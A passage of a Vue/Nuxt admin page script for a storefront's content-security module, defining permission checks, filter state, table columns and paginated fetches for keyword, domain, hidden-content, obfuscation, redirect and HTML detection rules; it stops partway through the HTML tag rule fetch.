<!-- File: /pages/admin/content-security/index.vue -->
<script setup lang="ts">
import { ref, computed, watch, onMounted } from 'vue';
import { useRoute, useRouter } from '#app';
import { 
  Shield, 
  ShieldAlert, 
  ShieldCheck, 
  AlertTriangle, 
  AlertOctagon, 
  CheckCircle2, 
  Search, 
  Play, 
  RefreshCw, 
  Filter, 
  Layers, 
  Package, 
  ExternalLink, 
  Eye, 
  Edit3, 
  Check, 
  X, 
  Plus, 
  Trash2, 
  Code2, 
  Globe2, 
  FileText, 
  SlidersHorizontal, 
  ArrowRight, 
  Info,
  Clock,
  Sparkles,
  ChevronRight,
  MoreVertical,
  RotateCcw,
  Loader2,
  Calendar,
  User,
  Hash,
  Activity,
  FileCode,
  CheckCircle,
  XCircle,
  AlertCircle
} from 'lucide-vue-next';
import { cn } from '@/utils';
import { toastSuccess, toastInfo, toastWarning, toastError, extractErrorMessage } from '@/composables/useToast';
import UiTable, { type UiTableColumn } from '@/components/ui/UiTable.vue';
import UiPagination from '@/components/ui/UiPagination.vue';
import UiAdminModal from '@/components/ui/UiAdminModal.vue';
import UiBadge from '@/components/ui/UiBadge.vue';
import UiButton from '@/components/ui/Button.vue';
import { refDebounced } from '@vueuse/core';
import { useContentSecurityService } from '@/composables/useContentSecurityService';
import { useProductService } from '@/composables/useProductService';
import { useCategoryService } from '@/composables/useCategoryService';
import { useBrandService } from '@/composables/useBrandService';
import { useBlogService } from '@/composables/useBlogService';
import { useAdminPermissions } from '@/composables/useAdminPermissions';
import { useAdminModalState } from '@/composables/useAdminModalState';
import type { 
  KeywordRule, 
  KeywordRuleDetail, 
  KeywordCategory, 
  KeywordMatchType, 
  KeywordSeverity, 
  CreateKeywordRulePayload,
  UpdateKeywordRulePayload,
  DomainRule,
  DomainRuleDetail,
  DomainMatchType,
  CreateDomainRulePayload,
  UpdateDomainRulePayload,
  DomainRulesQueryParams,
  HiddenContentRule,
  HiddenContentRuleDetail,
  CreateHiddenContentRulePayload,
  UpdateHiddenContentRulePayload,
  HiddenContentRulesQueryParams,
  ObfuscationRule,
  ObfuscationRuleDetail,
  CreateObfuscationRulePayload,
  UpdateObfuscationRulePayload,
  ObfuscationRulesQueryParams,
  RedirectRule,
  RedirectRuleDetail,
  CreateRedirectRulePayload,
  UpdateRedirectRulePayload,
  RedirectRulesQueryParams,
  HtmlAttributeRule,
  HtmlAttributeRuleDetail,
  CreateHtmlAttributeRulePayload,
  UpdateHtmlAttributeRulePayload,
  HtmlAttributeRulesQueryParams,
  HtmlTagRule,
  HtmlTagRuleDetail,
  CreateHtmlTagRulePayload,
  UpdateHtmlTagRulePayload,
  HtmlTagRulesQueryParams,
  PaginatedHtmlTagRules,
  ContentScan,
  ContentScansQueryParams,
  ContentScanRunRequest,
  ContentScanDetail,
  ContentScanFindingDetail,
  ContentScanFindingReviewRequest,
  ContentScanFindingResolveRequest,
  ContentScanFindingListItem,
  ContentScanFindingsQueryParams,
  DetectionRulesSummary
} from '@/types';

definePageMeta({
  layout: 'admin'
});

useSeoMeta({
  title: 'Content Security - Best Computer Hub Admin',
  robots: 'noindex, nofollow'
});

// ==========================================
// Types
// ==========================================
export type SecurityStatus = 'Clean' | 'Needs Review' | 'High Risk' | 'Critical' | 'Resolved';
export type SecuritySeverity = 'Low' | 'Medium' | 'High' | 'Critical';
export type ContentType = 'Product' | 'Category';
export type DetectorType = 'Keyword' | 'Domain' | 'HTML' | 'Attribute' | 'Redirect' | 'Hidden Content' | 'Obfuscation';

export interface SecurityFinding {
  id: string;
  contentType: ContentType;
  contentId: string | number;
  contentName: string;
  contentSlug: string;
  categoryName?: string;
  field: string;
  riskScore: number;
  status: SecurityStatus;
  severity: SecuritySeverity;
  detector: DetectorType;
  ruleName: string;
  description: string;
  matchedValue: string;
  contextSnippetBefore: string;
  contextSnippetMatched: string;
  contextSnippetAfter: string;
  lineOffset: number;
  scannedAt: string;
  storefrontUrl: string;
  adminEditUrl: string;
}

export interface DetectionRule {
  id: string;
  type: 'keyword' | 'domain' | 'hidden_content' | 'obfuscation' | 'html' | 'attribute' | 'redirect';
  pattern: string;
  category: string;
  severity: SecuritySeverity;
  description: string;
  enabled: boolean;
  matchCount: number;
  updatedAt: string;
}

// ==========================================
// State Management
// ==========================================
const mainTab = ref<'overview' | 'results' | 'findings' | 'rules'>('overview');
const rulesSubTab = ref<'keywords' | 'domains' | 'hidden_content' | 'obfuscation' | 'html' | 'attributes' | 'redirects'>('keywords');

const { hasPermission } = useAdminPermissions();
const canViewKeywords = computed(() => hasPermission('content_security.view_keywordrule'));
const canAddKeywordRule = computed(() => hasPermission('content_security.add_keywordrule'));
const canEditKeywordRule = computed(() => hasPermission('content_security.change_keywordrule'));
const canDeleteKeywordRule = computed(() => hasPermission('content_security.delete_keywordrule'));

const canViewDomains = computed(() => hasPermission('content_security.view_domainrule'));
const canAddDomainRule = computed(() => hasPermission('content_security.add_domainrule'));
const canEditDomainRule = computed(() => hasPermission('content_security.change_domainrule'));
const canDeleteDomainRule = computed(() => hasPermission('content_security.delete_domainrule'));

const canViewHiddenContent = computed(() => hasPermission('content_security.view_hiddencontentrule'));
const canAddHiddenContentRule = computed(() => hasPermission('content_security.add_hiddencontentrule'));
const canEditHiddenContentRule = computed(() => hasPermission('content_security.change_hiddencontentrule'));
const canDeleteHiddenContentRule = computed(() => hasPermission('content_security.delete_hiddencontentrule'));

const canViewObfuscation = computed(() => hasPermission('content_security.view_obfuscationrule'));
const canAddObfuscationRule = computed(() => hasPermission('content_security.add_obfuscationrule'));
const canEditObfuscationRule = computed(() => hasPermission('content_security.change_obfuscationrule'));
const canDeleteObfuscationRule = computed(() => hasPermission('content_security.delete_obfuscationrule'));

const canViewRedirects = computed(() => hasPermission('content_security.view_redirectrule'));
const canAddRedirectRule = computed(() => hasPermission('content_security.add_redirectrule'));
const canEditRedirectRule = computed(() => hasPermission('content_security.change_redirectrule'));
const canDeleteRedirectRule = computed(() => hasPermission('content_security.delete_redirectrule'));

const canViewHtmlAttributeRules = computed(() => hasPermission('content_security.view_htmlattributerule'));
const canAddHtmlAttributeRule = computed(() => hasPermission('content_security.add_htmlattributerule'));
const canEditHtmlAttributeRule = computed(() => hasPermission('content_security.change_htmlattributerule'));
const canDeleteHtmlAttributeRule = computed(() => hasPermission('content_security.delete_htmlattributerule'));

const canViewHtmlTagRules = computed(() => hasPermission('content_security.view_htmltagrule'));
const canAddHtmlTagRule = computed(() => hasPermission('content_security.add_htmltagrule'));
const canEditHtmlTagRule = computed(() => hasPermission('content_security.change_htmltagrule'));
const canDeleteHtmlTagRule = computed(() => hasPermission('content_security.delete_htmltagrule'));

const canViewContentScans = computed(() => hasPermission('content_security.view_contentscan'));
const canRunContentScan = computed(() => hasPermission('content_security.run_content_scan'));
const canViewFindings = computed(() => hasPermission('content_security.view_contentscanfinding'));
const canReviewFinding = computed(() => hasPermission('content_security.review_content_scan_finding'));
const canResolveFinding = computed(() => hasPermission('content_security.resolve_content_scan_finding'));

const contentSecurityService = useContentSecurityService();
const isKeywordsLoading = computed(() => contentSecurityService.isLoading.value);
const keywordsError = computed(() => contentSecurityService.error.value);

// Detection Rules Summary State
const detectionRulesSummary = ref<DetectionRulesSummary>({
  keyword_rules: 0,
  domain_rules: 0,
  hidden_content_rules: 0,
  obfuscation_rules: 0,
  redirect_rules: 0,
  html_attribute_rules: 0,
  html_tag_rules: 0,
  total: 0
});
const isDetectionRulesSummaryLoading = ref(false);

const fetchDetectionRulesSummary = async () => {
  if (
    !canViewKeywords.value &&
    !canViewDomains.value &&
    !canViewHiddenContent.value &&
    !canViewObfuscation.value &&
    !canViewRedirects.value &&
    !canViewHtmlAttributeRules.value &&
    !canViewHtmlTagRules.value
  ) {
    return;
  }

  isDetectionRulesSummaryLoading.value = true;
  try {
    const data = await contentSecurityService.getDetectionRulesSummary();
    detectionRulesSummary.value = data;
  } catch (err: any) {
    // Handled in service
  } finally {
    isDetectionRulesSummaryLoading.value = false;
  }
};

// Keyword Rules Query/Data States
const keywordSearchQuery = ref('');
const debouncedKeywordSearch = refDebounced(keywordSearchQuery, 300);
const keywordCategory = ref<string>('all');
const keywordSeverity = ref<string>('all');
const keywordMatchType = ref<string>('all');
const keywordIsActive = ref<string>('all');
const keywordIsEnabled = ref<string>('all');
const keywordOrdering = ref<string>('-created_at');
const keywordPage = ref(1);
const keywordPageSize = ref(10);
const keywordRulesData = ref<KeywordRule[]>([]);
const keywordRulesCount = ref(0);
const keywordRulesPages = ref(1);

const keywordRuleColumns: UiTableColumn<KeywordRule>[] = [
  { key: 'keyword', label: 'Keyword', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 font-mono text-sm font-bold text-foreground' },
  { key: 'category', label: 'Category', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'match_type', label: 'Match Type', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap text-xs' },
  { key: 'severity', label: 'Severity', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'is_enabled', label: 'Enabled', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'is_active', label: 'Active', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'created_at', label: 'Created At', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap text-xs text-muted-foreground' },
  { key: 'actions', label: 'Actions', align: 'right' as const, width: '100px', headerClass: 'px-4 py-3 text-right whitespace-nowrap', cellClass: 'px-4 py-3 text-right whitespace-nowrap' }
];

const resetKeywordFilters = () => {
  keywordSearchQuery.value = '';
  keywordCategory.value = 'all';
  keywordSeverity.value = 'all';
  keywordMatchType.value = 'all';
  keywordIsActive.value = 'all';
  keywordIsEnabled.value = 'all';
  keywordOrdering.value = '-created_at';
  keywordPage.value = 1;
};

const fetchKeywordRules = async () => {
  if (!canViewKeywords.value) return;
  
  const params: any = {
    page: keywordPage.value,
    page_size: keywordPageSize.value,
    ordering: keywordOrdering.value
  };

  if (debouncedKeywordSearch.value.trim()) {
    params.search = debouncedKeywordSearch.value.trim();
  }
  if (keywordCategory.value !== 'all') {
    params.category = keywordCategory.value;
  }
  if (keywordSeverity.value !== 'all') {
    params.severity = keywordSeverity.value;
  }
  if (keywordMatchType.value !== 'all') {
    params.match_type = keywordMatchType.value;
  }
  if (keywordIsActive.value !== 'all') {
    params.is_active = keywordIsActive.value === 'true';
  }
  if (keywordIsEnabled.value !== 'all') {
    params.is_enabled = keywordIsEnabled.value === 'true';
  }

  const response = await contentSecurityService.getKeywordRules(params);
  keywordRulesData.value = response.results;
  keywordRulesCount.value = response.count;
  keywordRulesPages.value = response.pages;
};

// Domain Rules Query/Data States
const isDomainsLoading = ref(false);
const domainsError = ref<string | null>(null);
const domainSearchQuery = ref('');
const debouncedDomainSearch = refDebounced(domainSearchQuery, 300);
const domainCategory = ref<string>('all');
const domainSeverity = ref<string>('all');
const domainMatchType = ref<string>('all');
const domainIsActive = ref<string>('all');
const domainIsEnabled = ref<string>('all');
const domainOrdering = ref<string>('-created_at');
const domainPage = ref(1);
const domainPageSize = ref(10);
const domainRulesData = ref<DomainRule[]>([]);
const domainRulesCount = ref(0);
const domainRulesPages = ref(1);

const domainRuleColumns: UiTableColumn<DomainRule>[] = [
  { key: 'domain', label: 'Domain', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 font-mono text-sm font-bold text-foreground' },
  { key: 'category', label: 'Category', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'match_type', label: 'Match Type', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap text-xs' },
  { key: 'severity', label: 'Severity', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'is_enabled', label: 'Enabled', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'is_active', label: 'Active', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'created_at', label: 'Created At', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap text-xs text-muted-foreground' },
  { key: 'actions', label: 'Actions', align: 'right' as const, width: '100px', headerClass: 'px-4 py-3 text-right whitespace-nowrap', cellClass: 'px-4 py-3 text-right whitespace-nowrap' }
];

const resetDomainFilters = () => {
  domainSearchQuery.value = '';
  domainCategory.value = 'all';
  domainSeverity.value = 'all';
  domainMatchType.value = 'all';
  domainIsActive.value = 'all';
  domainIsEnabled.value = 'all';
  domainOrdering.value = '-created_at';
  domainPage.value = 1;
};

const fetchDomainRules = async () => {
  if (!canViewDomains.value) return;
  
  isDomainsLoading.value = true;
  domainsError.value = null;

  try {
    const params: DomainRulesQueryParams = {
      page: domainPage.value,
      page_size: domainPageSize.value,
      ordering: domainOrdering.value
    };

    if (debouncedDomainSearch.value.trim()) {
      params.search = debouncedDomainSearch.value.trim();
    }
    if (domainCategory.value !== 'all') {
      params.category = domainCategory.value as KeywordCategory;
    }
    if (domainSeverity.value !== 'all') {
      params.severity = domainSeverity.value as KeywordSeverity;
    }
    if (domainMatchType.value !== 'all') {
      params.match_type = domainMatchType.value as DomainMatchType;
    }
    if (domainIsActive.value !== 'all') {
      params.is_active = domainIsActive.value === 'true';
    }
    if (domainIsEnabled.value !== 'all') {
      params.is_enabled = domainIsEnabled.value === 'true';
    }

    const response = await contentSecurityService.getDomainRules(params);
    domainRulesData.value = response.results;
    domainRulesCount.value = response.count;
    domainRulesPages.value = response.pages;
  } catch (err: any) {
    domainsError.value = extractErrorMessage(err, 'Failed to retrieve domain rules.');
  } finally {
    isDomainsLoading.value = false;
  }
};

// Hidden Content Rules Query/Data States
const isHiddenContentLoading = ref(false);
const hiddenContentError = ref<string | null>(null);
const hiddenContentSearchQuery = ref('');
const debouncedHiddenContentSearch = refDebounced(hiddenContentSearchQuery, 300);
const hiddenContentCategory = ref<string>('all');
const hiddenContentSeverity = ref<string>('all');
const hiddenContentIsActive = ref<string>('all');
const hiddenContentIsEnabled = ref<string>('all');
const hiddenContentOrdering = ref<string>('-created_at');
const hiddenContentPage = ref(1);
const hiddenContentPageSize = ref(10);
const hiddenContentRulesData = ref<HiddenContentRule[]>([]);
const hiddenContentRulesCount = ref(0);
const hiddenContentRulesPages = ref(1);

const hiddenContentRuleColumns: UiTableColumn<HiddenContentRule>[] = [
  { key: 'pattern', label: 'CSS Declaration / Pattern', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 font-mono text-sm font-bold text-foreground' },
  { key: 'category', label: 'Category', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'severity', label: 'Severity', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'is_enabled', label: 'Enabled', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'is_active', label: 'Active', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'created_at', label: 'Created At', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap text-xs text-muted-foreground' },
  { key: 'actions', label: 'Actions', align: 'right' as const, width: '80px', headerClass: 'px-4 py-3 text-right whitespace-nowrap', cellClass: 'px-4 py-3 text-right whitespace-nowrap' }
];

const resetHiddenContentFilters = () => {
  hiddenContentSearchQuery.value = '';
  hiddenContentCategory.value = 'all';
  hiddenContentSeverity.value = 'all';
  hiddenContentIsActive.value = 'all';
  hiddenContentIsEnabled.value = 'all';
  hiddenContentOrdering.value = '-created_at';
  hiddenContentPage.value = 1;
};

const fetchHiddenContentRules = async () => {
  if (!canViewHiddenContent.value) return;
  
  isHiddenContentLoading.value = true;
  hiddenContentError.value = null;

  try {
    const params: HiddenContentRulesQueryParams = {
      page: hiddenContentPage.value,
      page_size: hiddenContentPageSize.value,
      ordering: hiddenContentOrdering.value
    };

    if (debouncedHiddenContentSearch.value.trim()) {
      params.search = debouncedHiddenContentSearch.value.trim();
    }
    if (hiddenContentCategory.value !== 'all') {
      params.category = hiddenContentCategory.value as KeywordCategory;
    }
    if (hiddenContentSeverity.value !== 'all') {
      params.severity = hiddenContentSeverity.value as KeywordSeverity;
    }
    if (hiddenContentIsActive.value !== 'all') {
      params.is_active = hiddenContentIsActive.value === 'true';
    }
    if (hiddenContentIsEnabled.value !== 'all') {
      params.is_enabled = hiddenContentIsEnabled.value === 'true';
    }

    const response = await contentSecurityService.getHiddenContentRules(params);
    hiddenContentRulesData.value = response.results;
    hiddenContentRulesCount.value = response.count;
    hiddenContentRulesPages.value = response.pages;
  } catch (err: any) {
    hiddenContentError.value = extractErrorMessage(err, 'Failed to retrieve hidden content rules.');
  } finally {
    isHiddenContentLoading.value = false;
  }
};

// Obfuscation Rules Query/Data States
const isObfuscationLoading = ref(false);
const obfuscationError = ref<string | null>(null);
const obfuscationSearchQuery = ref('');
const debouncedObfuscationSearch = refDebounced(obfuscationSearchQuery, 300);
const obfuscationCategory = ref<string>('all');
const obfuscationSeverity = ref<string>('all');
const obfuscationIsActive = ref<string>('all');
const obfuscationIsEnabled = ref<string>('all');
const obfuscationOrdering = ref<string>('-created_at');
const obfuscationPage = ref(1);
const obfuscationPageSize = ref(10);
const obfuscationRulesData = ref<ObfuscationRule[]>([]);
const obfuscationRulesCount = ref(0);
const obfuscationRulesPages = ref(1);

const obfuscationRuleColumns: UiTableColumn<ObfuscationRule>[] = [
  { key: 'pattern', label: 'Obfuscation Pattern / Regex', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 font-mono text-sm font-bold text-foreground' },
  { key: 'category', label: 'Category', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'severity', label: 'Severity', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'is_enabled', label: 'Enabled', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'is_active', label: 'Active', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'created_at', label: 'Created At', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap text-xs text-muted-foreground' },
  { key: 'actions', label: 'Actions', align: 'right' as const, width: '80px', headerClass: 'px-4 py-3 text-right whitespace-nowrap', cellClass: 'px-4 py-3 text-right whitespace-nowrap' }
];

const resetObfuscationFilters = () => {
  obfuscationSearchQuery.value = '';
  obfuscationCategory.value = 'all';
  obfuscationSeverity.value = 'all';
  obfuscationIsActive.value = 'all';
  obfuscationIsEnabled.value = 'all';
  obfuscationOrdering.value = '-created_at';
  obfuscationPage.value = 1;
};

const fetchObfuscationRules = async () => {
  if (!canViewObfuscation.value) return;
  
  isObfuscationLoading.value = true;
  obfuscationError.value = null;

  try {
    const params: ObfuscationRulesQueryParams = {
      page: obfuscationPage.value,
      page_size: obfuscationPageSize.value,
      ordering: obfuscationOrdering.value
    };

    if (debouncedObfuscationSearch.value.trim()) {
      params.search = debouncedObfuscationSearch.value.trim();
    }
    if (obfuscationCategory.value !== 'all') {
      params.category = obfuscationCategory.value as KeywordCategory;
    }
    if (obfuscationSeverity.value !== 'all') {
      params.severity = obfuscationSeverity.value as KeywordSeverity;
    }
    if (obfuscationIsActive.value !== 'all') {
      params.is_active = obfuscationIsActive.value === 'true';
    }
    if (obfuscationIsEnabled.value !== 'all') {
      params.is_enabled = obfuscationIsEnabled.value === 'true';
    }

    const response = await contentSecurityService.getObfuscationRules(params);
    obfuscationRulesData.value = response.results;
    obfuscationRulesCount.value = response.count;
    obfuscationRulesPages.value = response.pages;
  } catch (err: any) {
    obfuscationError.value = extractErrorMessage(err, 'Failed to retrieve obfuscation rules.');
  } finally {
    isObfuscationLoading.value = false;
  }
};

// Redirect Rules Query/Data States
const isRedirectsLoading = ref(false);
const redirectsError = ref<string | null>(null);
const redirectSearchQuery = ref('');
const debouncedRedirectSearch = refDebounced(redirectSearchQuery, 300);
const redirectCategory = ref<string>('all');
const redirectSeverity = ref<string>('all');
const redirectIsActive = ref<string>('all');
const redirectIsEnabled = ref<string>('all');
const redirectOrdering = ref<string>('-created_at');
const redirectPage = ref(1);
const redirectPageSize = ref(10);
const redirectRulesData = ref<RedirectRule[]>([]);
const redirectRulesCount = ref(0);
const redirectRulesPages = ref(1);

const redirectRuleColumns: UiTableColumn<RedirectRule>[] = [
  { key: 'pattern', label: 'Redirect Pattern / Heuristic', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 font-mono text-sm font-bold text-foreground' },
  { key: 'category', label: 'Category', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'severity', label: 'Severity', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'is_enabled', label: 'Enabled', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'is_active', label: 'Active', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'created_at', label: 'Created At', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap text-xs text-muted-foreground' },
  { key: 'actions', label: 'Actions', align: 'right' as const, width: '80px', headerClass: 'px-4 py-3 text-right whitespace-nowrap', cellClass: 'px-4 py-3 text-right whitespace-nowrap' }
];

const resetRedirectFilters = () => {
  redirectSearchQuery.value = '';
  redirectCategory.value = 'all';
  redirectSeverity.value = 'all';
  redirectIsActive.value = 'all';
  redirectIsEnabled.value = 'all';
  redirectOrdering.value = '-created_at';
  redirectPage.value = 1;
};

const fetchRedirectRules = async () => {
  if (!canViewRedirects.value) return;
  
  isRedirectsLoading.value = true;
  redirectsError.value = null;

  try {
    const params: RedirectRulesQueryParams = {
      page: redirectPage.value,
      page_size: redirectPageSize.value,
      ordering: redirectOrdering.value
    };

    if (debouncedRedirectSearch.value.trim()) {
      params.search = debouncedRedirectSearch.value.trim();
    }
    if (redirectCategory.value !== 'all') {
      params.category = redirectCategory.value as KeywordCategory;
    }
    if (redirectSeverity.value !== 'all') {
      params.severity = redirectSeverity.value as KeywordSeverity;
    }
    if (redirectIsActive.value !== 'all') {
      params.is_active = redirectIsActive.value === 'true';
    }
    if (redirectIsEnabled.value !== 'all') {
      params.is_enabled = redirectIsEnabled.value === 'true';
    }

    const response = await contentSecurityService.getRedirectRules(params);
    redirectRulesData.value = response.results;
    redirectRulesCount.value = response.count;
    redirectRulesPages.value = response.pages;
  } catch (err: any) {
    redirectsError.value = extractErrorMessage(err, 'Failed to retrieve redirect rules.');
  } finally {
    isRedirectsLoading.value = false;
  }
};

// HTML Attribute Rules Query/Data States
const isHtmlAttributeLoading = ref(false);
const htmlAttributeError = ref<string | null>(null);
const htmlAttributeSearchQuery = ref('');
const debouncedHtmlAttributeSearch = refDebounced(htmlAttributeSearchQuery, 300);
const htmlAttributeCategory = ref<string>('all');
const htmlAttributeSeverity = ref<string>('all');
const htmlAttributeIsActive = ref<string>('all');
const htmlAttributeIsEnabled = ref<string>('all');
const htmlAttributeOrdering = ref<string>('-created_at');
const htmlAttributePage = ref(1);
const htmlAttributePageSize = ref(10);
const htmlAttributeRulesData = ref<HtmlAttributeRule[]>([]);
const htmlAttributeRulesCount = ref(0);
const htmlAttributeRulesPages = ref(1);

const htmlAttributeRuleColumns: UiTableColumn<HtmlAttributeRule>[] = [
  { key: 'attribute', label: 'Attribute / Pattern', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 font-mono text-sm font-bold text-foreground' },
  { key: 'category', label: 'Category', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'severity', label: 'Severity', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'is_enabled', label: 'Enabled', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'is_active', label: 'Active', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'created_at', label: 'Created At', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap text-xs text-muted-foreground' },
  { key: 'actions', label: 'Actions', align: 'right' as const, width: '80px', headerClass: 'px-4 py-3 text-right whitespace-nowrap', cellClass: 'px-4 py-3 text-right whitespace-nowrap' }
];

const resetHtmlAttributeFilters = () => {
  htmlAttributeSearchQuery.value = '';
  htmlAttributeCategory.value = 'all';
  htmlAttributeSeverity.value = 'all';
  htmlAttributeIsActive.value = 'all';
  htmlAttributeIsEnabled.value = 'all';
  htmlAttributeOrdering.value = '-created_at';
  htmlAttributePage.value = 1;
};

const fetchHtmlAttributeRules = async () => {
  if (!canViewHtmlAttributeRules.value) return;
  
  isHtmlAttributeLoading.value = true;
  htmlAttributeError.value = null;

  try {
    const params: HtmlAttributeRulesQueryParams = {
      page: htmlAttributePage.value,
      page_size: htmlAttributePageSize.value,
      ordering: htmlAttributeOrdering.value
    };

    if (debouncedHtmlAttributeSearch.value.trim()) {
      params.search = debouncedHtmlAttributeSearch.value.trim();
    }
    if (htmlAttributeCategory.value !== 'all') {
      params.category = htmlAttributeCategory.value as KeywordCategory;
    }
    if (htmlAttributeSeverity.value !== 'all') {
      params.severity = htmlAttributeSeverity.value as KeywordSeverity;
    }
    if (htmlAttributeIsActive.value !== 'all') {
      params.is_active = htmlAttributeIsActive.value === 'true';
    }
    if (htmlAttributeIsEnabled.value !== 'all') {
      params.is_enabled = htmlAttributeIsEnabled.value === 'true';
    }

    const response = await contentSecurityService.getHtmlAttributeRules(params);
    htmlAttributeRulesData.value = response.results;
    htmlAttributeRulesCount.value = response.count;
    htmlAttributeRulesPages.value = response.pages;
  } catch (err: any) {
    htmlAttributeError.value = extractErrorMessage(err, 'Failed to retrieve HTML attribute rules.');
  } finally {
    isHtmlAttributeLoading.value = false;
  }
};

// HTML Tag Rules Query/Data States
const isHtmlTagLoading = ref(false);
const htmlTagError = ref<string | null>(null);
const htmlTagSearchQuery = ref('');
const debouncedHtmlTagSearch = refDebounced(htmlTagSearchQuery, 300);
const htmlTagCategory = ref<string>('all');
const htmlTagSeverity = ref<string>('all');
const htmlTagIsActive = ref<string>('all');
const htmlTagIsEnabled = ref<string>('all');
const htmlTagOrdering = ref<string>('-created_at');
const htmlTagPage = ref(1);
const htmlTagPageSize = ref(10);
const htmlTagRulesData = ref<HtmlTagRule[]>([]);
const htmlTagRulesCount = ref(0);
const htmlTagRulesPages = ref(1);

const htmlTagRuleColumns: UiTableColumn<HtmlTagRule>[] = [
  { key: 'tag', label: 'Tag / Pattern', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 font-mono text-sm font-bold text-foreground' },
  { key: 'category', label: 'Category', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'severity', label: 'Severity', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'is_enabled', label: 'Enabled', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'is_active', label: 'Active', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'created_at', label: 'Created At', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap text-xs text-muted-foreground' },
  { key: 'actions', label: 'Actions', align: 'right' as const, width: '80px', headerClass: 'px-4 py-3 text-right whitespace-nowrap', cellClass: 'px-4 py-3 text-right whitespace-nowrap' }
];

const resetHtmlTagFilters = () => {
  htmlTagSearchQuery.value = '';
  htmlTagCategory.value = 'all';
  htmlTagSeverity.value = 'all';
  htmlTagIsActive.value = 'all';
  htmlTagIsEnabled.value = 'all';
  htmlTagOrdering.value = '-created_at';
  htmlTagPage.value = 1;
};

const fetchHtmlTagRules = async () => {
  if (!canViewHtmlTagRules.value) return;
  
  isHtmlTagLoading.value = true;
  htmlTagError.value = null;

  try {
    const params: HtmlTagRulesQueryParams = {
      page: htmlTagPage.value,
      page_size: htmlTagPageSize.value,
      ordering: htmlTagOrdering.value
    };

    if (debouncedHtmlTagSearch.value.trim()) {
      params.search = debouncedHtmlTagSearch.value.trim();
    }
    if (htmlTagCategory.value !== 'all') {
      params.category = htmlTagCategory.value as KeywordCategory;
    }
    if (htmlTagSeverity.value !== 'all') {
      params.severity = htmlTagSeverity.value as KeywordSeverity;
    }
    if (htmlTagIsActive.value !== 'all') {
      params.is_active = htmlTagIsActive.value === 'true';
    }
    if (htmlTagIsEnabled.value !== 'all') {
      params.is_enabled = htmlTagIsEnabled.value === 'true';
    }

    const response = await contentSecurityService.getHtmlTagRules(params);
    htmlTagRulesData.value = response.results;
    htmlTagRulesCount.value = response.count;
